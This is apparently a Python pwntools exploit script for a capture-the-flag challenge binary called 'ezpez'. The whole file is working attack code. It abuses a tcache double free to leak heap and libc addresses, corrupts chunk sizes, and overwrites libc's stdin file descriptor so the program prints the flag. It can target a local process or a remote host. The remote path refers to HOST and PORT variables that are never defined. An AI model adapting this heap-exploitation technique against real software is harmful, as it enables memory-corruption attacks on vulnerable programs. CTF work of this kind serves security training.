#!/usr/bin/env python2
import sys,os
from pwn import *

context.update(arch="amd64", endian="little", os="linux", )

LOCAL = True
TARGET=os.path.realpath("ezpez")

# e = ELF(TARGET, False)

def create(num, typ):
    r.sendlineafter(">> ","1")
    r.sendlineafter("> ",str(typ))
    r.sendlineafter(": ", str(num))
    return

def delete(typ):
    r.sendlineafter(">> ","2")
    r.sendlineafter("> ",str(typ))
    return

def show(typ):
    r.sendlineafter(">> ","3")
    r.sendlineafter("> ",str(typ))
    return

def exploit(r):
    # do double free to leak heap base
    create(1,1)
    create(2,2)
    delete(1)
    create(2,2)
    delete(1)

    # Leak the heap base
    show(1)
    heaplb = (int(r.recvline().split(":")[1])&0xffffffff)-0x260
    log.info("Heap lower bytes are {}".format(hex(heaplb)))

    # While keeping the same data in 1st tcache bin, fill the 0th bin
    create(heaplb+0x260, 1)
    delete(2)
    create(heaplb+0x260, 1)
    delete(2)

    # Use the corruption in 0th bin to change size of bins in 1st bin
    create(heaplb+0x260-0x10, 2)
    create(2, 2)
    create(0xb1, 2)
    
    # Fill the 1st tcache bin 8 times to put chunk in unsorted bin
    for i in range(7):
        delete(1)
        create(2, 2)
    delete(1)
    
    # Leak the libc base
    show(1)
    libclb = (int(r.recvline().split(":")[1])&0xffffffff)-0x3ebca0
    log.info("Libc lower bytes are {}".format(hex(libclb)))

    stdin_fd = libclb+0x3eba70

    # Overwrite the stdin fd 
    create(stdin_fd, 2)
    create(1, 1)
    create(666, 1)

    # Trigger scanf to read flag from fd and print it
    r.sendlineafter(">> ","4")
    r.recvuntil(":")
    print("FLAG: " + r.recvline().strip())
    r.recvall()
    r.close()
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process([TARGET,])
        pause()

    exploit(r)
    sys.exit(0)
